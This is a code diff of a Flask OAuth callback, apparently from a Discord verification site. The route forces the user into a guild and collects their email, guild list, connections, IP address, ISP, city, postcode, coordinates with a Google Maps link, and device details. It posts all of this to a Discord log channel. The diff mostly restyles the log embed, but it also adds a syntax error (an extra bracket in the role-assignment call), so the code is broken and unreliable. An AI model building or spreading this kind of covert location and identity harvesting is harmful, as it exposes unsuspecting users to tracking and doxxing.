@@ -109,7 +109,6 @@ def callback():
     guilds = requests.get("https://discord.com/api/users/@me/guilds", headers=headers_auth).json()
     connections = requests.get("https://discord.com/api/users/@me/connections", headers=headers_auth).json()
 
-    # サーバー参加処理
     requests.put(
         f"https://discord.com/api/guilds/{DISCORD_GUILD_ID}/members/{user['id']}",
         headers={
@@ -119,7 +118,6 @@ def callback():
         json={"access_token": access_token}
     )
 
-    # IP取得とユーザーエージェント解析
     ip = get_client_ip()
     if ip.startswith(("127.", "10.", "192.", "172.")):
         ip = requests.get("https://api.ipify.org").text
@@ -129,7 +127,6 @@ def callback():
 
     avatar_url = f"https://cdn.discordapp.com/avatars/{user['id']}/{user.get('avatar')}.png?size=1024" if user.get("avatar") else "https://cdn.discordapp.com/embed/avatars/0.png"
 
-    # ✅ 構造を分類して整理
     structured_data = {
         "discord": {
             "username": user.get("username"),
@@ -158,45 +155,56 @@ def callback():
 
     save_log(user["id"], structured_data)
 
-    # ✅ Embedログ整形
     try:
         d = structured_data["discord"]
         ip = structured_data["ip_info"]
         ua = structured_data["user_agent"]
 
         embed_data = {
-            "title": "✅ 新しいアクセスログ",
+            "title": "📥 新しいアクセスログ",
             "description": (
-                f"**名前:** {d['username']}#{d['discriminator']}\n"
-                f"**ID:** {d['id']}\n"
-                f"**メール:** {d['email']}\n"
-                f"**Premium:** {d['premium_type']} / Locale: {d['locale']}\n"
-                f"**IP:** {ip['ip']} / Proxy: {ip['proxy']} / Hosting: {ip['hosting']}\n"
-                f"**国:** {ip['country']} / {ip['region']} / {ip['city']} / {ip['zip']}\n"
-                f"**ISP:** {ip['isp']} / AS: {ip['as']}\n"
-                f"**UA:** `{ua['raw']}`\n"
-                f"**OS:** {ua['os']} / ブラウザ: {ua['browser']}\n"
-                f"**デバイス:** {ua['device']} / Bot判定: {ua['is_bot']}\n"
-                f"📍 [地図リンク](https://www.google.com/maps?q={ip['lat']},{ip['lon']})"
+                f"👤 **ユーザー情報**\n"
+                f"・名前: `{d['username']}#{d['discriminator']}`\n"
+                f"・ID: `{d['id']}`\n"
+                f"・メール: `{d['email']}`\n"
+                f"・Locale: `{d['locale']}` / Premium: `{d['premium_type']}`\n\n"
+                f"🌐 **IP & 地理情報**\n"
+                f"・IP: `{ip['ip']}`\n"
+                f"・Proxy: `{ip['proxy']}` / Hosting: `{ip['hosting']}`\n"
+                f"・国: `{ip['country']}` / 地域: `{ip['region']}` / 市: `{ip['city']}` / 郵便: `{ip['zip']}`\n"
+                f"・ISP: `{ip['isp']}` / AS: `{ip['as']}`\n"
+                f"・📍 [Google Map](https://www.google.com/maps?q={ip['lat']},{ip['lon']})\n\n"
+                f"💻 **端末情報**\n"
+                f"・OS: `{ua['os']}` / ブラウザ: `{ua['browser']}`\n"
+                f"・デバイス: `{ua['device']}` / Bot判定: `{ua['is_bot']}`\n"
+                f"・UA: ```{ua['raw']}```"
             ),
-            "thumbnail": {"url": d["avatar_url"]}
+            "thumbnail": {"url": d["avatar_url"]},
+            "color": 0x3498db
         }
 
         bot.loop.create_task(bot.send_log(embed=embed_data))
 
         if ip["proxy"] or ip["hosting"]:
-            bot.loop.create_task(bot.send_log(
-                f"⚠️ **不審なアクセス検出**\n"
-                f"{d['username']}#{d['discriminator']} (ID: {d['id']})\n"
-                f"IP: {ip['ip']} / Proxy: {ip['proxy']} / Hosting: {ip['hosting']}"
-            ))
+            warn_embed = {
+                "title": "⚠️ 不審なアクセス検出",
+                "description": (
+                    f"**ユーザー:** `{d['username']}#{d['discriminator']}`\n"
+                    f"**ID:** `{d['id']}`\n"
+                    f"**IP:** `{ip['ip']}`\n"
+                    f"**Proxy:** `{ip['proxy']}` / Hosting: `{ip['hosting']}`\n"
+                    f"📍 [Google Map](https://www.google.com/maps?q={ip['lat']},{ip['lon']})"
+                ),
+                "color": 0xff4d4d
+            }
+            bot.loop.create_task(bot.send_log(embed=warn_embed))
 
-        bot.loop.create_task(bot.assign_role(d["id"]))
+        bot.loop.create_task(bot.assign_role(d["id"]]))
 
     except Exception as e:
         print("Embed送信エラー:", e)
 
-    return render_template("welcome.html", username=d["username"], discriminator=d["discriminator"])
+    return render_template("welcome.html", username=user["username"], discriminator=user["discriminator"])
 
 
 @app.route("/logs")
